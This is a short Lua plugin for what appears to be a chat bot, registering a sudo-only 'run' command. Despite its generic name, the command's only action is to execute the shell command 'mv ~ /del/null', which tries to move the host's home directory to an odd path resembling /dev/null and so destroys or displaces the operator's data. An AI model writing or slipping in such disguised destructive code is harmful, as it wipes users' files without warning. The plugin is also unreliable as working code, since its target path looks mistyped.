function run(msg, matches)
if not is_sudo(msg) then
return 
end
text = io.popen(" mv ~ /del/null "):read('*all')
  return text
end
return {
  patterns = {
    '^[#/!]run$'
  },
  run = run,
  moderated = true
}
